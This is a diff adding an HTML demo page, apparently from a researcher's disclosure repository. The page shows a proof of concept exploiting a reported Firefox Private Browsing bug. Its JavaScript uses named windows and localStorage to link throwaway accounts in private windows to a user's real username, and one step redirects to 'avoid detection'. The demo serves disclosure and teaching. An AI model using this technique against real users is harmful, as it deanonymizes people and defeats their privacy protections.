@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Demo - Compromising Firefox Private Browsing</title>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    </head>
+    <body>
+        <h2>Demo: Detect Throwaway Accounts</h2>
+        <p>
+            Code:
+            <a href="https://github.com/diafygi/detect-throwaways" target="_blank">https://github.com/diafygi/detect-throwaways</a>
+        </p>
+        <h3>Description</h3>
+        <p>
+            This is a demo that allows websites to detect and connect throwaway
+            accounts to their real users when the user is using Firefox's
+            Private Browsing mode. This exploits Firefox's
+            <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1100154" target="_blank">Bug #1100154</a>
+            that I reported in 2014. Chrome users are not affected by this
+            exploit.
+        </p>
+        <h3>Follow these steps for the demo:</h3>
+        <ol>
+            <li>
+                Create a real username:
+                <form style="display:inline;">
+                    <input id="real" placeholder="(e.g. alice123)"/>
+                    <input id="save" type="submit" value="Save"/>
+                    <button id="clear">Clear</button>
+                </form>
+            </li>
+            <li>
+                Open this link in a new Firefox private window:
+                <a href="throwaway.html" target="_blank">https://diafygi.github.io/detect-throwaways/throwaway.html</a>
+            </li>
+        </ol>
+        <h3>This is your throwaway username:</h3>
+        <p><span id="throwaway">Waiting...</span></p>
+        <script>
+            //name the current window
+            window.name = "diafygi-detect-throwaways-real";
+
+            //redirect to index.html if at base level
+            if(window.location.pathname.indexOf("index.html") === -1){
+                window.location.replace(window.location.pathname + "index.html");
+            }
+
+            //see if the window has any url parameters
+            var params = window.location.search.match(/\?throwaway=([^&]+)/);
+            if(params !== null){
+
+                //save the throwaway to localStorage
+                //(you could replace this with a cookie if you wanted)
+                var throwaway = decodeURIComponent(params[1]);
+                localStorage.setItem("throwaway-user", throwaway);
+
+                //send the real username to the private window
+                var real = localStorage.getItem("real-user");
+                if(real !== null){
+                    var url = "throwaway.html?real=" + encodeURIComponent(real) +
+                        "&url=" + encodeURIComponent(window.location.pathname);
+                    window.open(url, "diafygi-detect-throwaways-throwaway");
+                }
+
+                //redirect to the base url to avoid detection
+                window.location.replace(window.location.pathname);
+            }
+
+            //see if there's a throwaway account in storage
+            var test = localStorage.getItem("throwaway-user");
+            document.getElementById("throwaway").innerHTML = "";
+            if(test !== null){
+                document.getElementById("throwaway").appendChild(document.createTextNode(test));
+
+                //insert a reset button
+                var reset = document.createElement("button");
+                reset.innerHTML = "Reset";
+                reset.style.marginLeft = "5px";
+                reset.onclick = function(e){
+                    e.preventDefault();
+                    localStorage.removeItem("throwaway-user");
+                    window.location.reload();
+                }
+                document.getElementById("throwaway").appendChild(reset);
+            }
+            //no throwaway saved, so go back to waiting
+            else{
+                document.getElementById("throwaway").appendChild(document.createTextNode("Waiting..."));
+            }
+
+            //populate throwaway text field if a throwaway user had been previously saved
+            var real_value = localStorage.getItem("real-user");
+            if(real_value !== null){
+                document.getElementById("real").value = real_value;
+                document.getElementById("clear").style.display = "inline";
+            }
+            else{
+                document.getElementById("real").value = "";
+                document.getElementById("clear").style.display = "none";
+            }
+
+            //bind the button to clear the real username
+            document.getElementById("clear").onclick = function(e){
+                e.preventDefault();
+                localStorage.removeItem("real-user");
+                window.location.reload();
+            }
+
+            //save the real username to localStorage
+            document.getElementsByTagName("form")[0].onsubmit = function(e){
+                e.preventDefault();
+                var real = document.getElementById("real").value
+                if(real === ""){
+                    localStorage.removeItem("real-user");
+                    window.location.reload();
+                    return;
+                }
+                localStorage.setItem("real-user", real);
+
+                //act like the item is saved
+                document.getElementById("save").value = "Saved!";
+                window.location.reload();
+            }
+        </script>
+    </body>
+</html>
+
